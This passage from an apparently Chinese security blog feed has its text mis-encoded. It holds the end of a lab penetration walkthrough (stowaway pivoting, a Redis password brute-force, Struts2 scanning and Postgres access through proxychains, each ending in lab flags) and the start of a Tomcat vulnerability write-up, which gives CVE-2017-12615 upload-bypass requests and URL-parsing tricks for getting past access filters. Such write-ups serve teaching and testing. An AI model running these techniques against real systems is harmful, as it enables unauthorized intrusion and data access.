InfoScan http://172.56.102.3       [phpMyAdmin] [+] PocScan http://172.56.102.4:8080 poc-yaml-struts2_045 poc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p>åé¢æ‰“å®Œäº†æ‰å‘ç°æ¼äº†è¿™ä¸ªç«¯å£ï¼ˆ</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">10.85.101.2:6379 open<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>stowawayè½¬å‘å‡ºæ¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>node <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>></span> forward <span class="token number">9000</span> <span class="token number">10.85</span>.101.2:6379<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”¨è¿™ä¸ªå¯¹redisçš„å¯†ç è¿›è¡Œçˆ†ç ´ï¼š<a href="https://github.com/vgo0/redisbrute">https://github.com/vgo0/redisbrute</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€$ ./redisbrute <span class="token parameter variable">--ip</span> <span class="token number">192.168</span>.4.210 <span class="token parameter variable">--port</span> <span class="token number">9000</span> <span class="token parameter variable">--passwords</span> /usr/share/wordlists/rockyou.txt<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid password found - <span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°å¯†ç 12345</p><p>ç™»å½•redisï¼Œæ‹¿åˆ°flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.4.210 <span class="token parameter variable">-p</span> <span class="token number">9000</span> <span class="token parameter variable">-a</span> <span class="token string">"12345"</span><span class="token operator">></span> KEYS *<span class="token operator">></span> GET flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="å†…ç½‘ä»£ç†ç¬¬ä¸‰å±‚"><a href="#å†…ç½‘ä»£ç†ç¬¬ä¸‰å±‚" class="headerlink" title="å†…ç½‘ä»£ç†ç¬¬ä¸‰å±‚"></a>å†…ç½‘ä»£ç†ç¬¬ä¸‰å±‚</h1><p>åŒæ ·çš„æ“ä½œï¼Œåœ¨phpMyAdminé¶æœºä¸Šé¢ä¼ stowaway linux_x64_agent</p><p>ä¸»æœºæ§åˆ¶ç«¯è¾“å…¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">1</span>listen<span class="token number">1</span><span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å³åœ¨tpé¶æœºä¸Šå¼€ç›‘å¬1234ç«¯å£</p><p>phpMyAdminé¶æœºä¸Šè¿æ¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> <span class="token number">10.85</span>.101.3:1234 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯èŠ‚ç‚¹+1</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725195249782.png" alt="image-20240725195249782"></p><hr><h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[*] WebTitle http://172.56.102.4:8080  code:200 len:90     title:$Title$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ˜¯struts2çš„æœåŠ¡</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725200208511.png" alt="image-20240725200208511"></p><p>å·¥å…·ä¸€æŠŠæ¢­ï¼š<a href="https://github.com/abc123info/Struts2VulsScanTools">https://github.com/abc123info/Struts2VulsScanTools</a></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725200243894.png" alt="image-20240725200243894"></p><p>flagåœ¨&#x2F;flag.txtï¼š<code>WSS-Studio&#123;Struts2-b086a0a3-2b93-4b8a-981b-ca00d360e773&#125;</code></p><hr><h1 id="PostgresSQL"><a href="#PostgresSQL" class="headerlink" title="PostgresSQL"></a>PostgresSQL</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[+] Postgres:172.56.102.2:5432:postgres password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è´¦å¯†<code>postgres:password</code></p><p>ä¿®æ”¹kaliä¸­proxychainså·¥å…·çš„&#x2F;etc&#x2F;proxychains4.confï¼Œæ”¹æˆæˆ‘ä»¬çš„socksä»£ç†åœ°å€</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725211219637.png" alt="image-20240725211219637"></p><p>ç„¶ååœ¨<code>proxychains</code>ä¸‹ä½¿ç”¨<code>pgcli</code>è¿œç¨‹è¿æ¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŸ¥è¯¢</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/æ¡Œé¢<span class="token punctuation">]</span>â””â”€$ proxychains pgcli <span class="token parameter variable">-h</span> <span class="token number">172.56</span>.102.2 <span class="token parameter variable">-u</span> postgres<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains4.conf<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.16</span><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OKPassword <span class="token keyword">for</span> postgres: <span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OK<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432 Server: PostgreSQL <span class="token number">16.3</span>Version: <span class="token number">3.4</span>.1Home: http://pgcli.compostgres@172:postgres<span class="token operator">></span>  <span class="token punctuation">..</span>.  OKpostgres@172:postgres<span class="token operator">></span> <span class="token punctuation">\</span>l+-----------+----------+----------+------------+------------+-----------------------+<span class="token operator">|</span> Name      <span class="token operator">|</span> Owner    <span class="token operator">|</span> Encoding <span class="token operator">|</span> Collate    <span class="token operator">|</span> Ctype      <span class="token operator">|</span> Access privileges     <span class="token operator">|</span><span class="token operator">|</span>-----------+----------+----------+------------+------------+-----------------------<span class="token operator">|</span><span class="token operator">|</span> flag      <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">&lt;</span>null<span class="token operator">></span>                <span class="token operator">|</span><span class="token operator">|</span> postgres  <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">&lt;</span>null<span class="token operator">></span>                <span class="token operator">|</span><span class="token operator">|</span> template0 <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">=</span>c/postgres           <span class="token operator">|</span><span class="token operator">|</span>           <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>            <span class="token operator">|</span>            <span class="token operator">|</span> <span class="token assign-left variable">postgres</span><span class="token operator">=</span>CTc/postgres <span class="token operator">|</span><span class="token operator">|</span> template1 <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">=</span>c/postgres           <span class="token operator">|</span><span class="token operator">|</span>           <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>            <span class="token operator">|</span>            <span class="token operator">|</span> <span class="token assign-left variable">postgres</span><span class="token operator">=</span>CTc/postgres <span class="token operator">|</span>+-----------+----------+----------+------------+------------+-----------------------+SELECT <span class="token number">4</span>Time: <span class="token number">0</span>.052spostgres@172:postgres<span class="token operator">></span> <span class="token punctuation">\</span>c flag<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OKYou are now connected to database <span class="token string">"flag"</span> as user <span class="token string">"postgres"</span>Time: <span class="token number">0</span>.590spostgres@172:flag<span class="token operator">></span> <span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OKpostgres@172:flag<span class="token operator">></span> <span class="token punctuation">\</span>dt+--------+------+-------+----------+<span class="token operator">|</span> Schema <span class="token operator">|</span> Name <span class="token operator">|</span> Type  <span class="token operator">|</span> Owner    <span class="token operator">|</span><span class="token operator">|</span>--------+------+-------+----------<span class="token operator">|</span><span class="token operator">|</span> public <span class="token operator">|</span> flag <span class="token operator">|</span> table <span class="token operator">|</span> postgres <span class="token operator">|</span>+--------+------+-------+----------+SELECT <span class="token number">1</span>Time: <span class="token number">1</span>.853s <span class="token punctuation">(</span><span class="token number">1</span> second<span class="token punctuation">)</span>, executed in: <span class="token number">1</span>.851s <span class="token punctuation">(</span><span class="token number">1</span> second<span class="token punctuation">)</span>postgres@172:flag<span class="token operator">></span> SELECT * FROM flag+-------------------------------------------------------------+<span class="token operator">|</span> data                                                        <span class="token operator">|</span><span class="token operator">|</span>-------------------------------------------------------------<span class="token operator">|</span><span class="token operator">|</span> WSS-Studio<span class="token punctuation">&#123;</span>Postgresql-cb6cba4a-6d7b-43b6-bfc4-0146b0d0e5af<span class="token punctuation">&#125;</span> <span class="token operator">|</span>+-------------------------------------------------------------+SELECT <span class="token number">1</span>Time: <span class="token number">0</span>.050s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³•äºŒï¼šstowawayç›´æ¥è½¬å‘è¿™ä¸ªæ•°æ®åº“çš„ç«¯å£</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>node <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">>></span> forward <span class="token number">9000</span> <span class="token number">172.56</span>.102.2:5432<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725212738296.png" alt="image-20240725212738296"></p><p>ç„¶ånavicatè¿æ¥127.0.0.1:9000</p><p>å¦‚æœnavicatè¿æ¥æ—¶æŠ¥é”™ï¼š<code>column &quot;datlastsysoid&quot; does not exist  Line1:SELECT DISTINCT datalastsysoid FROM pg_database</code></p><p>è¯·å‚è€ƒè¿™ç¯‡æ–‡ç« ä¿®æ”¹å¯¹åº”çš„dllæ–‡ä»¶ï¼š<a href="https://cloud.tencent.com/developer/article/2314524">https://cloud.tencent.com/developer/article/2314524</a></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725212821261.png" alt="image-20240725212821261"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿™æ˜¯ä»€ä¹ˆï¼ŸNISAå†…éƒ¨é¶åœºï¼Œæ‰“ä¸€ä¸‹&lt;/p&gt;</summary>
    
    
    
    <category term="æ¸—é€" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="Redis" scheme="http://c1oudfl0w0.github.io/blog/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Tomcatæ¼æ´æ€»ç»“</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2024-07-23T09:14:11.000Z</published>
    <updated>2024-07-26T09:35:16.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/10083">https://xz.aliyun.com/t/10083</a></p><p><a href="https://xz.aliyun.com/t/7544">https://xz.aliyun.com/t/7544</a></p><span id="more"></span><hr><h1 id="Tomcat-PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰"><a href="#Tomcat-PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰" class="headerlink" title="Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰"></a>Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰</h1><p>å¤ç°ç¯å¢ƒï¼š<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/">https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/</a></p><p>ç‰ˆæœ¬é™åˆ¶ï¼šä¸ç¡®å®šï¼Œè²Œä¼¼æ˜¯ä¸€ä¸ªé…ç½®æ¼æ´</p><p>æ¼æ´æˆå› ï¼š</p><p>&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf&#x2F;web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>readonlyè®¾ç½®ä¸ºfalseï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ PUT æ–¹æ³•è¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726115438187.png" alt="image-20240726115438187"></p><p>è¿”å›201ï¼Œè¯´æ˜æˆåŠŸä¸Šä¼ </p><p>çœ‹ä¸€ä¸‹ &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT ç›®å½•</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726115527994.png" alt="image-20240726115527994"></p><p>å¯ä»¥çœ‹åˆ°åˆšæ‰ä¸Šä¼ çš„test.txtæ–‡ä»¶</p><p>æ¥ä¸‹æ¥å°è¯•ä¸Šä¼ .jspï¼Œè¿”å›404ï¼Œåº”è¯¥æ˜¯å½“æˆè·¯å¾„è®¿é—®è¿›è¡Œè§£æäº†</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726115822467.png" alt="image-20240726115822467"></p><p>è¿™é‡Œå°±éœ€è¦è¿›è¡Œç»•è¿‡ï¼Œæœ‰ä¸‰ç§æ–¹æ³•ï¼š</p><ol><li>Windowsä¸‹ä¸å…è®¸æ–‡ä»¶ä»¥ç©ºæ ¼ç»“å°¾ï¼šä»¥<code>PUT /a001.jsp%20 HTTP/1.1</code>ä¸Šä¼ åˆ° Windows ä¼šè¢«è‡ªåŠ¨å»æ‰æœ«å°¾ç©ºæ ¼</li><li>Windows NTFSæµï¼š<code>PUT /a001.jsp::$DATA HTTP/1.1</code>\</li><li><code>/</code>åœ¨æ–‡ä»¶åä¸­æ˜¯éæ³•çš„ï¼Œä¹Ÿä¼šè¢«å»é™¤ï¼ˆLinux&#x2F;Windowsï¼‰ï¼š<code>PUT /a001.jsp/ HTTP/1.1</code></li></ol><p>è¿™é‡Œåªæ¼”ç¤ºç¬¬ä¸‰ç§ï¼š</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726120126859.png" alt="image-20240726120126859"></p><p>æˆåŠŸä¸Šä¼ ï¼Œç„¶åèšå‰‘getshellå³å¯</p><hr><h1 id="Tomcat-URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜"><a href="#Tomcat-URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜" class="headerlink" title="Tomcat URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜"></a>Tomcat URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜</h1><p>åå°ä½¿ç”¨<code>getRequestURI()</code>æˆ–<code>getRequestURL()</code>å‡½æ•°æ¥è§£æç”¨æˆ·è¯·æ±‚çš„URLæ—¶ï¼Œè‹¥URLä¸­åŒ…å«äº†ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œåˆ™å¯èƒ½ä¼šé€ æˆè®¿é—®é™åˆ¶ç»•è¿‡çš„å®‰å…¨é£é™©</p><h2 id="HTTPServletRequestå¯¹URLçš„è§£æå·®å¼‚æ€§"><a href="#HTTPServletRequestå¯¹URLçš„è§£æå·®å¼‚æ€§" class="headerlink" title="HTTPServletRequestå¯¹URLçš„è§£æå·®å¼‚æ€§"></a>HTTPServletRequestå¯¹URLçš„è§£æå·®å¼‚æ€§</h2><p>åœ¨Servletå¤„ç†URLè¯·æ±‚çš„è·¯å¾„æ—¶ï¼ŒHTTPServletRequestæœ‰å¦‚ä¸‹å‡ ä¸ªå¸¸ç”¨çš„å‡½æ•°ï¼š</p><ul><li><code>request.getRequestURL()</code>ï¼šè¿”å›å…¨è·¯å¾„ï¼›</li><li><code>request.getRequestURI()</code>ï¼šè¿”å›é™¤å»Hostï¼ˆåŸŸåæˆ–IPï¼‰éƒ¨åˆ†çš„è·¯å¾„ï¼›</li><li><code>request.getContextPath()</code>ï¼šè¿”å›å·¥ç¨‹åéƒ¨åˆ†ï¼Œå¦‚æœå·¥ç¨‹æ˜ å°„ä¸º<code>/</code>ï¼Œåˆ™è¿”å›ä¸ºç©ºï¼›</li><li><code>request.getServletPath()</code>ï¼šè¿”å›é™¤å»Hostå’Œå·¥ç¨‹åéƒ¨åˆ†çš„è·¯å¾„ï¼›</li><li><code>request.getPathInfo()</code>ï¼šä»…è¿”å›ä¼ é€’åˆ°Servletçš„è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰ä¼ é€’é¢å¤–çš„è·¯å¾„ä¿¡æ¯ï¼Œåˆ™æ­¤è¿”å›Nullï¼›</li></ul><p>è®¾Servletçš„åŒ¹é…è·¯å¾„ä¸º<code>/test%3F/*</code>ï¼Œå¹¶ä¸”Webåº”ç”¨æ˜¯éƒ¨ç½²åœ¨<code>/app</code>ä¸‹</p><p>æ­¤æ—¶è¯·æ±‚çš„URLä¸º<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>ï¼Œåˆ™å„ä¸ªå‡½æ•°è§£æå¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>å‡½æ•°</th><th>URLè§£ç </th><th>è§£æç»“æ„</th></tr></thead><tbody><tr><td>getRequestURL()</td><td>no</td><td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getRequestURI()</td><td>no</td><td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getContextPath()</td><td>no</td><td><code>/app</code></td></tr><tr><td>getServletPath()</td><td>yes</td><td><code>/test?</code></td></tr><tr><td>getPathInfo()</td><td>yes</td><td><code>/a?+b</code></td></tr></tbody></table><hr><h2 id="ç‰¹æ®Šå­—ç¬¦çš„URLè§£æ"><a href="#ç‰¹æ®Šå­—ç¬¦çš„URLè§£æ" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦çš„URLè§£æ"></a>ç‰¹æ®Šå­—ç¬¦çš„URLè§£æ</h2><p>Tomcatä¸­çš„URLè§£ææ˜¯æ”¯æŒåµŒå…¥<code>./</code>ã€<code>../</code>ã€<code>;xx/</code>ç­‰ç‰¹æ®Šå­—ç¬¦çš„</p><p>æ–°å»ºä¸€ä¸ªJava Webé¡¹ç›®ï¼Œ1.jspå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%out.println(&quot;getRequestURL(): &quot; + request.getRequestURL() + &quot;&lt;br&gt;&quot;);out.println(&quot;getRequestURI(): &quot; + request.getRequestURI() + &quot;&lt;br&gt;&quot;);out.println(&quot;getContextPath(): &quot; + request.getContextPath() + &quot;&lt;br&gt;&quot;);out.println(&quot;getServletPath(): &quot; + request.getServletPath() + &quot;&lt;br&gt;&quot;);out.println(&quot;getPathInfo(): &quot; + request.getPathInfo() + &quot;&lt;br&gt;&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ”¾åœ¨testç›®å½•ä¸‹</p><h3 id="æ­£å¸¸è®¿é—®"><a href="#æ­£å¸¸è®¿é—®" class="headerlink" title="æ­£å¸¸è®¿é—®"></a>æ­£å¸¸è®¿é—®</h3><p><code>http://localhost:8082/test/1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172209143.png" alt="image-20240726172209143"></p><h3 id="æ’å…¥-x2F-è®¿é—®"><a href="#æ’å…¥-x2F-è®¿é—®" class="headerlink" title="æ’å…¥ .&#x2F; è®¿é—®"></a>æ’å…¥ .&#x2F; è®¿é—®</h3><p>æ’å…¥å¤šä¸ª<code>./</code>è®¿é—®ï¼Œå³<code>http://localhost:8082/test/./././1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172226480.png" alt="image-20240726172226480"></p><p>æ¥ç€å°è¯•è¿™ç§å½¢å¼<code>http://localhost:8082/test/.a/.bb/.ccc/1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172358304.png" alt="image-20240726172358304"></p><p>è¿”å›404ï¼Œæœªæ‰¾åˆ°èµ„æº</p><h3 id="æ’å…¥-x2F-è®¿é—®-1"><a href="#æ’å…¥-x2F-è®¿é—®-1" class="headerlink" title="æ’å…¥ ..&#x2F; è®¿é—®"></a>æ’å…¥ ..&#x2F; è®¿é—®</h3><p>æ’å…¥<code>../</code>è®¿é—®ï¼Œå³<code>http://localhost:8082/test/../1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172534288.png" alt="image-20240726172534288"></p><p>404ï¼Œå› ä¸ºæ­¤æ—¶å®é™…è®¿é—®çš„æ˜¯<code>http://localhost:8082/test/1.jsp</code>ï¼Œä¹Ÿå°±è¯´æ˜è¿›è¡Œäº†ç›®å½•ç©¿è¶Š</p><h3 id="æ’å…¥-x2F-è®¿é—®-2"><a href="#æ’å…¥-x2F-è®¿é—®-2" class="headerlink" title="æ’å…¥ ;&#x2F; è®¿é—®"></a>æ’å…¥ ;&#x2F; è®¿é—®</h3><p>æ’å…¥å¤šä¸ª<code>;/</code>è®¿é—®ï¼Œå³<code>http://localhost:8082/test/;/;/;/1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172725318.png" alt="image-20240726172725318"></p><p>æ­£å¸¸è¿”å›ï¼ŒåŒæ ·çš„åœ¨<code>;</code>åé¢åŠ å­—ç¬¦ä¸²ä¹Ÿèƒ½æ­£å¸¸è®¿é—®</p><hr><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>å’•</p><hr><h2 id="æ”»å‡»åˆ©ç”¨"><a href="#æ”»å‡»åˆ©ç”¨" class="headerlink" title="æ”»å‡»åˆ©ç”¨"></a>æ”»å‡»åˆ©ç”¨</h2><p>é‡åˆ°ä¸‹é¢è¿™ç§filterï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">filter</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> testFilter <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServletRequest</span> httpServletRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>servletRequest<span class="token punctuation">;</span>        <span class="token class-name">HttpServletResponse</span> httpServletResponse <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span>servletResponse<span class="token punctuation">;</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> httpServletRequest<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/test/info"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            